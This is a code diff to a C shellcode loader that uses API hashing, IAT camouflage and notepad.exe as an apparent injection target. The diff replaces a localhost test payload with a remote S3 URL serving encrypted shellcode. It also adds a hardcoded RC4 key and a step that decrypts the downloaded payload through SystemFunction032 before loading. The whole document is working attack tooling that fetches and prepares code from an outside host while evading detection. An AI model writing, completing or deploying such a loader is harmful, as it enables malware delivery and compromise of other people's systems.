@@ -6,7 +6,7 @@
 #include "IATCamo.h"
 #include "Debug.h"
 
-#define PAYLOAD L"http://127.0.0.1:8000/calc.bin"
+#define PAYLOAD L"https://i-dont-love-daniel.s3.eu-north-1.amazonaws.com/encrypted_shellcode.bin"
 #define PROC L"notepad.exe"
 
 extern API_HASHING g_Api;
@@ -15,6 +15,10 @@ float _fltused = 0;
 
 #define DEBUG
 
+
+
+unsigned char ProtectedKey[] = {
+        0x54, 0xDB, 0x46, 0xF6, 0x01, 0xD1, 0x9D, 0x55, 0x5A, 0x84, 0x5A, 0xEA, 0x87, 0xFD, 0x74, 0xF1 };
 
 int main() {
 
@@ -30,6 +34,14 @@ int main() {
     if (!GetPayloadFromUrl(PAYLOAD, &pBytes, &sBytesSize)) {
         return -1;
     }
+
+
+    PRINTA("Decrypting...\n");
+    if (!Rc4EncryptionViSystemFunc032(ProtectedKey, pBytes, KEY_SIZE, sBytesSize)) {
+        return NULL;
+    }
+    PRINTA("DONE!!\n");
+
 
     PRINTA("Starting Get Module...\n\n");
     hNTDLL = GetMod(NTDLLDLL_DJB2);
